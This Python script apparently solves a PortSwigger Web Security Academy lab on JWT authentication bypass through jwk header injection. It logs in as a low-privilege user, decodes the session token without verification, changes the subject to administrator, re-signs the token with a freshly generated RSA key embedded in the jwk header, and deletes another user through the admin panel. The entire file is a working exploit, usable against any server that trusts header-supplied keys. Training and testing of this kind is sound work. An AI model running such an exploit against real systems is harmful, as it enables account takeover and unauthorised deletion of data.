#!/usr/bin/env python3
# JWT authentication bypass via jwk header injection
# Lab-Link: https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-jwk-header-injection
# Difficulty: PRACTITIONER
from bs4 import BeautifulSoup
import json
from jwcrypto import jwk
import jwt
import requests
import sys
import time
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def get_csrf_token(client, url):
    r = client.get(url)
    soup = BeautifulSoup(r.text, 'html.parser')
    return soup.find('input', attrs={'name': 'csrf'})['value']


def login(client, host, username, password):
    url = f'{host}/login'
    token = get_csrf_token(client, url)
    data = {'csrf': token,
            'username': username,
            'password': password}
    res = client.post(url, data=data)
    return f'Your username is: {username}' in res.text


def manipulate_cookie(client, host):
    cookie = client.cookies.get('session')

    payload = jwt.decode(cookie, options={"verify_signature": False})
    payload['sub'] = 'administrator'

    key = jwk.JWK.generate(kty='RSA', size=2048)
    public_key = key.export_public()    
    private_key = key.export_to_pem(private_key=True, password=None)
    print(f"[+] Generated RSA key pair")

    cookie = jwt.encode(payload,
                        private_key,
                        algorithm="RS256",
                        headers={"jwk": json.loads(public_key)})
    print(f"[+] Encoded JWT and injected JWK")

    client.cookies.set('session', cookie, domain=f'{host[8:]}')
    return True


def delete_carlos(client, host):
    url = f'{host}/admin/delete?username=carlos'
    return client.get(url, allow_redirects=False).status_code == 302


def main():
    print('[+] JWT authentication bypass via jwk header injection')
    try:
        host = sys.argv[1].strip().rstrip('/')
    except IndexError:
        print(f'Usage: {sys.argv[0]} <HOST>')
        print(f'Exampe: {sys.argv[0]} http://www.example.com')
        sys.exit(-1)

    with requests.Session() as client:
        client.verify = False
        client.proxies = proxies

        if not login(client, host, 'wiener', 'peter'):
            print(f'[-] Failed to log in as wiener')
            sys.exit(-3)
        print(f'[+] Log in as wiener successful')

        if not manipulate_cookie(client, host):
            print(f'[-] Failed to manipulate the cookie to impersonate administrator')
            sys.exit(-4)
        print(f'[+] Cookie manipulated to impersonate administrator')

        if not delete_carlos(client, host):
            print(f'[-] Failed to delete user carlos')
            sys.exit(-5)
        print(f'[+] Deletion of carlos appeared successful')

        # I had some times issues getting the proper result, so wait briefly before checking
        time.sleep(2)
        if 'Congratulations, you solved the lab!' not in client.get(f'{host}').text:
            print(f'[-] Failed to solve lab')
            sys.exit(-9)

        print(f'[+] Lab solved')


if __name__ == "__main__":
    main()
